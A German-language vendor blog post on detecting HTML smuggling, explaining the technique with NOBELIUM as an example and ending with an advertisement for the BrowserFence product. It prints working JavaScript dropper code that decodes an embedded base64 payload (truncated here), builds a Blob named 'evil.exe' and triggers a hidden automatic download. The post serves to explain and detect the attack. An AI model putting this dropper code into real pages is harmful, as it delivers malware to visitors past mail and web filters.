+++
title = 'HTML-Schmuggel-Erkennung'
date = 2024-06-21T17:04:20+02:00
draft = false
image = '/posts/html-smuggling/static/html-smuggling.png'
+++

## Einführung

HTML-Schmuggel ist eine fortschrittliche und heimliche Taktik, die Standard-HTML5- und JavaScript-Funktionen nutzt, um eine Erkennung zu vermeiden und Remote-Access-Trojaner (RATs), Bank-Malware und andere schädliche Software zu verbreiten. Diese Methode wird zunehmend von staatlich unterstützten Hackergruppen und Cyberkriminellen eingesetzt, um Regierungen, Einzelpersonen und Unternehmen zu infiltrieren. Ein bemerkenswertes Beispiel ist die Gruppe NOBELIUM, die angeblich Verbindungen zu Russland hat und HTML-Schmuggel verwendet hat, um weltweit Regierungs- und diplomatische Organisationen anzugreifen. Microsoft-Forscher haben beobachtet, dass die Gruppe NOBELIUM bösartige HTML-Anhänge in einer Kampagne namens EnvyScout verwendet hat. Diese Anhänge fungieren als Dropper, die in der Lage sind, verschleierte und bösartige ISO-Dateien auf dem System des Opfers zu schreiben.

## Wie HTML-Schmuggel funktioniert

Diese Malware wird im Wesentlichen verwendet, um Kontrolle über die Maschinen der Opfer zu erlangen, effektiv Payloads zu liefern und Ransomware-Angriffe auszuführen.

Beim HTML-Schmuggel verwendet der Angreifer einen speziell gestalteten HTML-Anhang, der ein codiertes bösartiges Skript enthält. Wenn das Opfer diese bösartige HTML-Datei in seinem Webbrowser öffnet, dekodiert der Browser dieses eingebettete bösartige Skript, das bei Ausführung die Payload weiter auf der Maschine des Opfers zusammenstellt. Der Hauptvorteil für die Angreifer besteht darin, dass anstatt die Payload über das Netzwerk zu übertragen, die bösartige Payload auf der Maschine des Opfers zusammengebaut wird. Dies macht die Technik hochgradig ausweichend, da sie Standard-Sicherheitskontrollen wie Web-Proxies, Firewalls und E-Mail-Gateways umgehen kann. Da die Payload erst erstellt wird, wenn die bösartige HTML-Datei auf der Maschine des Opfers über den Webbrowser geladen wird, sehen die Sicherheitslösungen nur HTML- oder JavaScript-Verkehr, der weiter verschleiert werden kann, um der Erkennung zu entgehen.

<img src="/posts/html-smuggling/static/HTMLsmuggling-1.jpg" alt="wo sind die Teile" style="display: block; margin-left: auto; margin-right: auto; width: 100%; height: auto;">

## Codeanalyse

In diesem Kapitel analysieren wir eine einfache Version einer HTML-Schmuggel-Payload. [den vollständigen Code ansehen](https://github.com/SofianeHamlaoui/Pentest-Notes/blob/master/offensive-security/defense-evasion/file-smuggling-with-html-and-javascript.md)

#### Base64-codierte Daten

```javascript
//Konvertierungsfunktion
function base64ToArrayBuffer(base64) {
    var binary_string = window.atob(base64);
    var len = binary_string.length;

    var bytes = new Uint8Array(len);
    for (var i = 0; i < len; i++) {
        bytes[i] = binary_string.charCodeAt(i);
    }
    return bytes.buffer;
}

//malware.exe in Base64 codiert
var file = 'TVqQAAMAAAAEAAAA//8AALgAA[...]nBkYgA=';
var data = base64ToArrayBuffer(file);
```

Wie wir gesehen haben, kann die bösartige HTML-Datei Malware auf das System des Opfers auf verschiedene Weise übertragen. In diesem Szenario ist die gesamte Malware-Payload in Base64 codiert und direkt in die HTML-Datei eingebettet. Wir sehen die Variable `file`, die die Payload enthält.

Die Funktion `base64ToArrayBuffer` konvertiert die codierte Payload in die eigentlichen Bytes, aus denen die bösartige Datei besteht.

Es ist wichtig zu beachten, dass Angreifer noch komplexere Methoden entwickeln können, um Malware zu verbreiten. Zum Beispiel könnten sie die Payload in mehrere Teile aufteilen, Teile davon remote abrufen oder verschiedene Codierungsstandards und Verschlüsselungstechniken verwenden. Diese Strategien erhöhen die Wahrscheinlichkeit, Sicherheitsmaßnahmen wie Web-Proxies, Firewalls und E-Mail-Gateways zu umgehen, erheblich.

#### JavaScript Blob

```javascript
var blob = new Blob([data], {type: 'octet/stream'});
var fileName = 'evil.exe';
```

Dies ist der Kern des Angriffs. Das Blob-Objekt ermöglicht die Erstellung einer Datei im Browser mithilfe von JavaScript-Code. So beschreibt es Mozilla:

```text
"Die Blob-Schnittstelle repräsentiert ein Blob, das ein dateiähnliches Objekt mit unveränderlichen, rohen Daten ist; sie können als Text oder Binärdaten gelesen oder in einen ReadableStream konvertiert werden, damit ihre Methoden zum Verarbeiten der Daten verwendet werden können.
Blobs können Daten darstellen, die nicht unbedingt in einem JavaScript-eigenen Format vorliegen. Die File-Schnittstelle basiert auf Blob, erbt die Blob-Funktionalität und erweitert sie, um Dateien auf dem System des Benutzers zu unterstützen."
```

<img src="/posts/html-smuggling/static/blob-struct.png" alt="wo sind die Teile" style="display: block; margin-left: auto; margin-right: auto; width: 100%; height: auto;">
<br>
Anstatt also auf den Webserver zu setzen, um eine Datei zu liefern, kann ein Blob lokal mithilfe von JavaScript erstellt werden. Zum Beispiel kann eine "evil.exe"-Datei, die normalerweise von einem Server heruntergeladen wird, stattdessen direkt auf dem Zielsystem zusammengestellt und heruntergeladen werden, indem ein HTML-Anker-Tag mit dem Attribut download verwendet wird.

#### HTML-Anker-Download

```javascript 
if (window.navigator.msSaveOrOpenBlob) {
    window.navigator.msSaveOrOpenBlob(blob, fileName);
} else {
    var a = document.createElement('a');
    console.log(a);
    document.body.appendChild(a);
    a.style = 'display: none';
    var url = window.URL.createObjectURL(blob);
    a.href = url;
    a.download = fileName;
    a.click();
    window.URL.revokeObjectURL(url);
}
```

Dieses Code-Snippet überprüft, ob der Browser `msSaveOrOpenBlob` unterstützt. Wenn unterstützt (für ältere Versionen von Internet Explorer und Microsoft Edge), verwendet es dies, um ein Blob-Objekt (blob) mit einem angegebenen Dateinamen (fileName) zu speichern oder zu öffnen. Wenn nicht unterstützt, erstellt es ein verstecktes `<a>`-Element im Dokument, richtet eine Blob-URL (url) für das Blob-Objekt (blob) ein, weist die URL dem href-Attribut des `<a>`-Elements zu, setzt das download-Attribut, um den Dateinamen (fileName) anzugeben, simuliert einen Klick auf das `<a>`-Element, um den Download auszulösen, und bereinigt durch das Zurückziehen der Blob-URL (url).

Zu diesem Zeitpunkt ist die bösartige Datei auf dem System des Opfers gespeichert.

### Verhalten im Browser

Es ist nun leicht vorstellbar, wie ein Angreifer zahlreiche Wege finden kann, eine bösartige Datei zu ziehen und sie direkt auf dem System des Opfers zusammenzusetzen. Wir können diese Phase als hochrangige Operation betrachten, bei der der Angreifer Kodierungen, Zeichenfolgen und verschiedene Remote- und eingebettete Ressourcen manipuliert. Doch irgendwann müssen sie spezifische Browser-APIs verwenden (niedrigstufige Operationen), um den Angriff durchzuführen. Hier können wir eingreifen und handeln!

#### Indikatoren für Kompromittierung auf Browser-Ebene

Jede Technik hinterlässt Spuren, und in diesem Fall werden unsere Indikatoren für Kompromittierung (IOCs) durch das Ereignis der Blob-Erstellung geliefert. Dieses Ereignis hat mehrere Parameter und Optionen, von denen die interessantesten der ArrayBuffer sind, der die Malware enthält, und der Typ, der auf octet/stream gesetzt sein muss.

<img src="/posts/html-smuggling/static/blob-event.png" alt="wo sind die Teile" style="display: block; margin-left: auto; margin-right: auto; width: 70%; height: auto;">
<br>
<img src="/posts/html-smuggling/static/buffer-array.png" alt="wo sind die Teile" style="display: block; margin-left: auto; margin-right: auto; width: 90%; height: auto;">
<br>
An dieser Stelle kann die bösartige Datei nicht mehr verschleiert, geteilt oder auf andere Weise verändert werden. Sie muss vollständig in den Speicher geladen werden, bereit zum Herunterladen. Daher ist es möglich, die Speicherzuweisung zu überwachen und diese Art von bösartiger Datei zu identifizieren.

Danach wird ein Anker-Element erstellt, das auf eine Blob-URL mit einem Download-Parameter verweist, wahrscheinlich mit einem `display:none`-Stil, gefolgt von einem programmgesteuerten Klick darauf. Diese Abfolge von Aktionen stellt ein weiteres spezifisches Verhalten dar, das identifiziert und überwacht werden kann, um bösartige Aktivitäten zu erkennen.

```html
<a href="blob:null/5f2c2f2a-0349-43d2-a6ec-276bd4efb082" download="evil.exe" style="display: none;"></

a>
```

## Fazit

Zusammenfassend stellt HTML-Schmuggel eine ausgeklügelte Methode dar, die von Cybergegnern genutzt wird, um traditionelle Sicherheitsmaßnahmen zu umgehen und bösartige Payloads direkt an ahnungslose Benutzer zu liefern. Durch das Einbetten von codierten Skripten in harmlos aussehende HTML-Dateien können Angreifer der Erkennung entgehen und schädliche Aktionen auf den Maschinen der Opfer ausführen. Diese Technik birgt erhebliche Risiken für Einzelpersonen, Unternehmen und Regierungen weltweit.

Bei TeamFence haben wir eine umfassende Analyse der HTML-Schmuggel-Techniken durchgeführt und verstehen die kritische Bedeutung proaktiver Verteidigungsmaßnahmen. Unsere Lösung ist darauf ausgelegt, diese heimtückischen Angriffe effektiv zu erkennen und zu mindern. Durch den Einsatz fortschrittlicher Erkennungsalgorithmen und Echtzeitüberwachungsfunktionen identifiziert BrowserFence verdächtige Verhaltensweisen im Zusammenhang mit HTML-Schmuggel, wie die Erstellung und Manipulation von Blob-URLs und die Zusammenstellung von bösartigen Payloads im Speicher.

Schützen Sie Ihre Organisation noch heute mit BrowserFence und bleiben Sie der sich ständig weiterentwickelnden Bedrohungslandschaft in der Cybersicherheit einen Schritt voraus. Kontaktieren Sie uns, um mehr darüber zu erfahren, wie BrowserFence Ihre digitalen Assets vor HTML-Schmuggel schützen und eine sichere Computerumgebung für Ihr Unternehmen gewährleisten kann.

<ul class="pt-4 d-flex gaps g-3 justify-content-center  animated" data-animate="fadeInUp" data-delay=".9">
    <li>
        <a href="#" class="btn btn-md btn-grad" data-overlay="bg-theme-grad-alternet"
           style="position: relative; top: 50px;">BrowserFence installieren</a>
    </li>
</ul>